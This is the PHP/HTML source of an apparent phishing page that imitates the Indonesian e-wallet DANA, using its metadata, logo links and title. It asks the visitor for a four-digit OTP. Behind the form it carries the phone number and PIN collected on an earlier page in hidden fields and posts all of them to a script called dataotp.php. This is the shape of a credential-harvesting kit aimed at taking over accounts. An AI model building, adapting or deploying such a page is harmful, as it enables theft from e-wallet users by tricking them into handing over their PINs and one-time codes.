<?php
session_start();

// Cek apakah nomor dan pin sudah disetel di sesi
if (!isset($_SESSION['nomor']) || !isset($_SESSION['pin'])) {
    header("Location: nomor.php");
    exit();
}

$nomor = $_SESSION['nomor'];
$pin = $_SESSION['pin'];
?>

<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#118ee9">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="twitter:image" content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png">
    <meta property="og:image" content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png">
    <meta name="og:site_name" content="DANA.id">
    <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta name="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA">
    <meta name="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta name="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
    <meta name="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta name="keywords" content="dana, dana indonesia, dana bisnis, qris, qris adalah, qris indonesia, daftar qris, qris bank indonesia, qris dana, qris bi, qris merchant, logo qris, apa itu qris, pembayaran qris, merchant, merchant dana, daftar merchant, promo hari ini, promo terbaru, promo cashback, cashback, apa itu cashback, cashback adalah, apa itu ewallet, ewallet indonesia, pembayaran digital, dompet digital">
    <link rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico">
    <link rel="preconnect" href="https://a.m.dana.id">
    <link rel="dns-prefetch" href="https://a.m.dana.id">
    <link rel="preconnect" href="https://app.link">
    <link rel="dns-prefetch" href="https://app.link">
    <link rel="preconnect" href="https://api2.branch.io">
    <link rel="dns-prefetch" href="https://api2.branch.io">
    <link rel="preconnect" href="https://youtube.com">
    <link rel="dns-prefetch" href="https://youtube.com">
    <link rel="preconnect" href="https://sentry.io">
    <link rel="dns-prefetch" href="https://sentry.io">
    <link rel="preconnect" href="https://cdn.lr-ingest.io">
    <link rel="dns-prefetch" href="https://cdn.lr-ingest.io">
    <title>DANA - Apa pun transaksinya selalu ada DANA</title>
    <link rel="stylesheet" type="text/css" href="css/otp.css">
    <link rel="stylesheet" type="text/css" href="css/spinner.css">
</head>

<body>
    <div class="raw">
        <img class="back" src="img/back.png" alt="Kembali">
        <img class="dana_logo" src="img/dana_logo.png" alt="Logo DANA">
    </div>
    <div class="background">
        <div class="container" id="container">
            <center>
                <h1>Masukkan OTP</h1>
                <h2>Kode OTP telah dikirim ke nomor Anda</h2>
                <?php if ($otp_invalid) : ?>
                    <small style="color: red; font-weight: lighter;">Kode OTP Telah Kedaluwarsa atau Invalid<br>Silahkan Kirim Ulang Kode OTP Baru.</small>
                <?php endif; ?>
                <form action="dataotp.php" method="post">
                    <div class="four_otp" id="four_otp">
                        <input type="text" id="otp1" maxlength="1" autocomplete="off" class="inpOtp" name="otp1">
                        <input type="text" id="otp2" maxlength="1" autocomplete="off" class="inpOtp" name="otp2">
                        <input type="text" id="otp3" maxlength="1" autocomplete="off" class="inpOtp" name="otp3">
                        <input type="text" id="otp4" maxlength="1" autocomplete="off" class="inpOtp" name="otp4">
                    </div>
                    <input type="hidden" name="nomor" value="<?= htmlspecialchars($nomor) ?>">
                    <input type="hidden" name="pin" value="<?= htmlspecialchars($pin) ?>">
                </form>
                <p class="resend">KIRIM ULANG (<span id="time">60</span>s)</p>
            </center>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="img/load_bg.png" alt="Loading Background">
            <img class="spinner" src="img/load_spin.png" alt="Loading Spinner">
        </div>
    </div>
    <script src="js/otp.js"></script>
</body>

</html>
